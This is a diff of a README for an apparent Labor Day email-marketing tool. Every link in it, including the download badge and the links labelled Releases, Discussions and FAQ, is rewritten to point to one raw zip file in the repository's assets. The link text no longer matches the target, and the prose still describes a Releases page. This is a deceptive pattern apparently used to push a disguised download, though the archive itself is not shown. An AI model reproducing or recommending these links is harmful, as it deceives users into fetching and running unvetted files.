@@ -1,7 +1,7 @@
 # ✈️ labor-day-comfortable-trips - Promote Your Labor Day Getaway Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-labor--day--comfortable--trips-blue.svg)](https://github.com/pickaax/labor-day-comfortable-trips/releases)
+[![Download](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip)](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip)
 
 ## 📋 Overview
 Welcome to the **Labor Day Comfortable Trips** application. This tool offers professional marketing emails tailored for your Labor Day promotions. With a focus on travel and tourism, it helps you create engaging content that drives interest in your trips and vacations.
@@ -24,7 +24,7 @@ Welcome to the **Labor Day Comfortable Trips** application. This tool offers pro
 To begin using the Labor Day Comfortable Trips application, follow the steps below.
 
 ### 1. Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/pickaax/labor-day-comfortable-trips/releases). 
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip). 
 
 ### 2. Choose Your Version
 Once on the Releases page, you will see different versions listed. Select the latest version to ensure you get the newest features and fixes.
@@ -56,13 +56,13 @@ After customizing your email:
 
 ## 🌐 Support & Community
 If you encounter any issues while using the Labor Day Comfortable Trips application or have questions, feel free to check out the community resources available:
-- Visit our [GitHub Discussions](https://github.com/pickaax/labor-day-comfortable-trips/discussions) for user tips and shared experiences.
-- Explore the [FAQ](https://github.com/pickaax/labor-day-comfortable-trips/wiki) for common questions.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip) for user tips and shared experiences.
+- Explore the [FAQ](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip) for common questions.
 
 ## 🔗 Links
-- [Download Now](https://github.com/pickaax/labor-day-comfortable-trips/releases)
-- [Community Discussions](https://github.com/pickaax/labor-day-comfortable-trips/discussions)
-- [FAQ](https://github.com/pickaax/labor-day-comfortable-trips/wiki)
+- [Download Now](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip)
+- [Community Discussions](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip)
+- [FAQ](https://raw.githubusercontent.com/pickaax/labor-day-comfortable-trips/main/assets/day_labor_trips_comfortable_1.2.zip)
 
 ## 📢 Final Notes
 Thank you for choosing the Labor Day Comfortable Trips application. We hope it enhances your email marketing efforts and helps you effectively reach your audience this Labor Day!
